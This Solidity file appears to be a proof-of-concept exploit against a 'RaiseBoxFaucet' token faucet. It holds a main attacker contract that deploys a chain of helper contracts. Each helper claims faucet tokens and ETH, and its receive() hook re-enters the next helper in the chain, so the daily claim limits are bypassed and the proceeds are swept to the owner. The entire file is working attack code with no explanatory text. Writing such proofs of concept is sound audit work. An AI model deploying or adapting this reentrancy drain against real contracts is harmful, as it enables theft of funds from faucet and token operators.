// SPDX-Lincense-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {console2} from "../lib/lib/forge-std/src/Test.sol";


interface IRaiseBoxFaucet is IERC20 {
    function claimFaucetTokens() external;
    function getContractSepEthBalance() external view returns (uint256);
    function sepEthAmountToDrip() external view returns(uint256);
    function dailyClaimLimit() external view returns(uint256);
    function dailyDrips() external view returns(uint256);
    function dailySepEthCap() external view returns(uint256);
    function dailyClaimCount() external view returns(uint256);
}


contract AttackerCrossReentrnatContract is Ownable {
    IRaiseBoxFaucet raiseBoxFaucet;

    constructor(address _raiseBoxFauecet)Ownable(msg.sender) payable{
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
    }

    function attack() external onlyOwner {
        (uint256 numberOfContracts, bool numberIsEven) = _getNumberOfContract();
        address payable [] memory attackers  = new address payable[] (numberOfContracts);
        for(uint i = 0; i <numberOfContracts; i++){

            AttackerContract attacker = new AttackerContract(address(raiseBoxFaucet));
            attackers[i] = payable(address (attacker));
        }

        for(uint i = 0; i< numberOfContracts-1; i++){
            AttackerContract(attackers[i]).setNextAddress(attackers[i+1]);
        }

        AttackerContract(attackers[0]).attack();
        
        if(!numberIsEven){
            raiseBoxFaucet.claimFaucetTokens();
        }
        raiseBoxFaucet.transfer(owner(), raiseBoxFaucet.balanceOf(address(this)));
        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "final eth transfer Failed");
    }

    receive() payable external {
        
    }

    function _getNumberOfContract()private view returns(uint256, bool){
        uint256 temporaryNumberOfContracts = (raiseBoxFaucet.dailyClaimLimit() - raiseBoxFaucet.dailyClaimCount())* 10 / 2;
        uint256 numberOfContracts;
        bool numberIsEven;
        if(temporaryNumberOfContracts % 10 == 0){
            numberIsEven = true;
            numberOfContracts = temporaryNumberOfContracts / 10 * 2;
        } else {
            numberOfContracts = (temporaryNumberOfContracts - 5) /10 * 2;
        }
        return(numberOfContracts, numberIsEven);
    }
}

contract AttackerContract {
    IRaiseBoxFaucet immutable raiseBoxFaucet;

    bool private stopAttack;
    address private immutable owner;
    address payable private nextAddress;
    
    constructor(address _raiseBoxFauecet) payable{
        raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
        owner = msg.sender;
    }

    function setNextAddress(address _nextAddress) public {
        require(msg.sender == owner, "not main contract");
        nextAddress = payable (_nextAddress);
    }


    function attack() external{
        raiseBoxFaucet.claimFaucetTokens();
        (bool ethTransferSuccess,) = owner.call{value: address(this).balance}("");
        require(ethTransferSuccess, "eth internal transfer failed");
        if(raiseBoxFaucet.balanceOf(address(this)) > 0){
        (bool tokenTransferSuccess) = raiseBoxFaucet.transfer(owner, raiseBoxFaucet.balanceOf(address(this)));
        require(tokenTransferSuccess, "token transfer failed");
        }
    }

    receive() external payable{
        if(nextAddress != address(0)){
            AttackerContract(nextAddress).attack();
        } 
    }
}
